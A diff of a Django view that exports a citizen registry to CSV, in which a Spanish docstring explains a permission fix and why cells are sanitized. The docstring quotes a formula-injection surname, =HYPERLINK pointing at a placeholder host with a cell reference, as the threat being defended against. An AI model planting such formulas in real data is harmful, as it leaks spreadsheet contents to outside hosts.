@@ -10,8 +10,8 @@ from django.urls import reverse_lazy
 from django.views.generic import CreateView, DetailView, FormView, ListView, UpdateView
 
 from core.dni import dni_valido
+from core.exportacion import celda_segura
 from core.rbac import CapacidadRequeridaMixin, puede, requiere
-from programas.services.exportacion_reportes import celda_segura
 
 from ..forms import (
     CiudadanoConfirmarForm,
@@ -63,9 +63,12 @@ class CiudadanoListView(CapacidadRequeridaMixin, LoginRequiredMixin, ListView):
 def ciudadanos_exportar_csv(request):
     """Exporta los ciudadanos visibles, respetando la búsqueda del listado.
 
-    SEC-20 (D-20): capacidad propia. Hasta acá cualquier ``ciudadano.ver`` —incluido
-    el «Operador de backoffice», que ni siquiera da altas— se bajaba el padrón entero
-    sin límite ni registro. Y las celdas pasan por ``celda_segura``: un apellido
+    SEC-20 (D-20): capacidad propia. Hasta acá cualquier ``ciudadano.ver`` se bajaba el
+    padrón entero sin límite ni registro, y no había forma de sacarle la descarga a un
+    rol sin sacarle también el legajo. La siembra la tilda sobre todo rol que ya tenía
+    ``ciudadano.ver`` (decisión del PM, 08/10/2026: nadie la pierde con el deploy), así
+    que lo que cambia hoy es que se puede destildar rol por rol desde el ABM de Roles,
+    sin deploy. Y las celdas pasan por ``celda_segura``: un apellido
     ``=HYPERLINK("https://x/?"&A2;"ver")`` cargado por el link público se ejecuta solo
     al abrir el CSV en Excel.
     """
